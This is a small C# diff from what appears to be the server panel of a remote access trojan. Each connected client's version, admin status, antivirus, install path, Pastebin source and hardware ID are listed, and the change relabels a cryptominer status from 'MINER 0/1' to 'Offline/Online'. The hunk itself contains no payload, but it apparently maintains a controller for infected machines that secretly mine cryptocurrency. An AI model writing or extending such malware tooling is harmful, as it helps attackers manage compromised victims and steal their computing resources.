@@ -35,7 +35,7 @@ namespace Server.Handle_Packet
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Antivirus").AsString);
-                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
+                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString.Replace("MINER 0", "MINER Offline").Replace("MINER 1", "MINER Online"));
                 client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                 client.LV.ToolTipText += "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
                 client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
